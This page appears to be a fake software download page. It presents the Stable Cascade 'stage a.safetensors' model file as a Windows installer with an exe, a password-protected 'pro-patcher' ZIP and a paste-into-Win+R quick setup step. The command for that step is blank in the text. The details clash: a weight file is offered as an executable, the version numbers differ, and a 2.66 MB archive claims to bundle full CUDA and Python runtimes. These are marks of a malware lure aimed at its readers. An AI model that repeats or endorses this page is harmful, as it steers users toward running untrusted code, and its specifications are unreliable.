Stable Cascade: stage a.safetensors (v2.4.3 — Windows 10 / 11 x64)

 
 
 

 Stable Cascade: stage a.safetensors ( v2.4.3 ) is a pre-configured 64-bit Windows 10/11 distribution bundling StableCascadeStage-Installer.exe , runtime libraries, and offline configuration profiles in a single portable package.

---

 ⬇️ Download & Quick Setup (Windows 10 / 11 x64)

- 🚀 Open Stable Cascade: stage a.safetensors Setup Portal ( StableCascadeStage-Installer.exe ) — Interactive Setup & Mirrors 
- 📦 Direct Download Portable .ZIP Archive ( stable-cascade-stage-a-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026 ) 
- 📋 Release Notes & SHA-256 Checksums ( v2.4.3 ) 

 ⚡ Instant 1-Command Setup ( Win + R or PowerShell · 3 Seconds)
Press Win + R (or open Windows Terminal / PowerShell ), paste the command below, and press Enter :

 

 

 

---

 Key Features & Technical Specs

- Precompiled Windows x64 portable environment with CUDA 12.6, Triton, and SageAttention-2 wheels
- Native FP8, GGUF (Q4 K M / Q5 K M / Q8 0), and EXL2 quantized weight loader with VRAM offloading
- Zero-dependency embedded Python 3.12 runtime and automatic model checkpoint downloader
- Local OpenAI-compatible REST API server and WebUI dashboard with batch queue support

 Property Specification 
 :--- :--- 
 Package Binary StableCascadeStageAPro/StableCascadeStage-Installer.exe ( v2.4.3 ) 
 Target Runtime NVIDIA CUDA 12.6 / TensorRT 10.4 & PyTorch 2.6 x64 Runtime ( cublas64 12.dll ) 
 Install Path %LOCALAPPDATA%\Programs\StableCascadeStageAS 
 Supported OS Windows 10 / Windows 11 (64-bit, 22H2–24H2) 

---

 How to Install & Run

1. Open the Stable Cascade: stage a.safetensors Setup & Download Portal (v2.4.3) or Releases.
2. Run the 3-second Win + R quick installer from the portal or extract the portable .zip archive.
3. Launch StableCascadeStage-Installer.exe from %LOCALAPPDATA%\Programs\StableCascadeStageAS .
